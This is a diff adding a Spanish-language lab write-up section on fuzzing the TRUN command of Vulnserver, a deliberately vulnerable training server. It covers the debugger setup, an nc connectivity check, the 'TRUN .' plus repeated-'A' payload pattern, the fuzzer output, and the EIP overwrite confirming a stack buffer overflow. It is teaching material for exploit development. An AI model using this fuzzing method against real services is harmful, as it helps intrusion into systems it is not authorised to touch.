@@ -86,6 +86,115 @@ El comando **TRUN** se considera un candidato potencial a vulnerabilidad de tipo
 - No parece implementar mecanismos de validación de tamaño.
 - Hace uso de funciones inseguras de manejo de memoria.
 
+## Fuzzing del comando TRUN
+
+Una vez identificado el comando TRUN como posible vector de ataque, se ha procedido a realizar fuzzing para comprobar su comportamiento ante entradas de gran tamaño.
+
+### Preparación del entorno
+
+Para llevar a cabo el fuzzing, se prepara el siguiente entorno:
+
+### Máquina víctima (Windows 10)
+
+1. Levantar **Vulnserver**.
+2. Abrir **Immunity Debugger** con privilegios de administrador.
+3. Cargar el ejecutable:
+```File → Attach → vulnserver.exe```
+4. Clickar en el botón de play
+
+De esta forma, VulnServer queda en ejecución y monitorizado por el debugger.
+
+<img width="1919" height="1028" alt="image" src="https://github.com/user-attachments/assets/f0d496ca-36f1-43a4-b54f-0f969083727f" />
+
+
+### Máquina atacante (Kali Linux)
+
+Se verifica la conectividad con el servicio:
+
+```bash
+nc 192.168.1.136 9999
+```
+Si el servidor responde con un banner, la conexión es correcta.
+
+### Procedimiento
+
+Vamos a utilizar el script Python3Fuzzing.py, proporcionado por TheMalwareGuardian, este envía peticiones al comando TRUN incrementando progresivamente el tamaño del buffer.
+
+El payload enviado sigue la estructura:
+
+```text
+TRUN . + "A" * tamaño_variable
+```
+
+En cada iteración, el tamaño del buffer aumenta, permitiendo identificar el punto en el que la aplicación deja de comportarse correctamente.
+
+### Ejecución
+
+El script se ejecuta desde la máquina atacante (Kali Linux), mientras que el servicio VulnServer se monitoriza mediante Immunity Debugger en la máquina Windows.
+
+### Resultado
+
+Exploit> Connect to target
+Server> Welcome to Vulnerable Server! Enter HELP for help.
+
+Exploit> Fuzzing b'TRUN' command with 100 bytes
+Server> TRUN COMPLETE
+
+--------------------------------------
+
+Exploit> Fuzzing b'TRUN' command with 400 bytes
+Server> TRUN COMPLETE
+
+--------------------------------------
+
+Exploit> Fuzzing b'TRUN' command with 700 bytes
+Server> TRUN COMPLETE
+
+--------------------------------------
+
+Exploit> Fuzzing b'TRUN' command with 1000 bytes
+Server> TRUN COMPLETE
+
+--------------------------------------
+
+Exploit> Fuzzing b'TRUN' command with 1300 bytes
+Server> TRUN COMPLETE
+
+--------------------------------------
+
+Exploit> Fuzzing b'TRUN' command with 1600 bytes
+Server> TRUN COMPLETE
+
+--------------------------------------
+
+Exploit> Fuzzing b'TRUN' command with 1900 bytes
+Server> TRUN COMPLETE
+
+--------------------------------------
+
+Exploit> Fuzzing b'TRUN' command with 2200 bytes
+
+El servidor responde correctamente a inputs de hasta aproximadamente 1900 bytes.
+
+Durante este proceso, al seguir incrementando el tamaño del buffer, la aplicación termina produciendo un fallo observable en Immunity Debugger:
+
+<img width="1919" height="1033" alt="image" src="https://github.com/user-attachments/assets/e3ec28ce-116c-4f8a-aea4-0b5fad6a7b52" />
+
+Al incrementar progresivamente el tamaño del buffer enviado al comando `TRUN`, la aplicación termina deteniéndose de forma inesperada.
+
+En el debugger se observa el siguiente error:
+
+```text
+Access violation when executing 41414141
+```
+
+Este comportamiento indica que:
+
+- El buffer enviado ha sobrescrito la memoria.
+- Se ha alcanzado el registro EIP.
+- El flujo de ejecución del programa está siendo controlado por datos del usuario.
+
+Confirmando que existe una vulnerabilidad de tipo Stack Buffer Overflow.
 
 
 
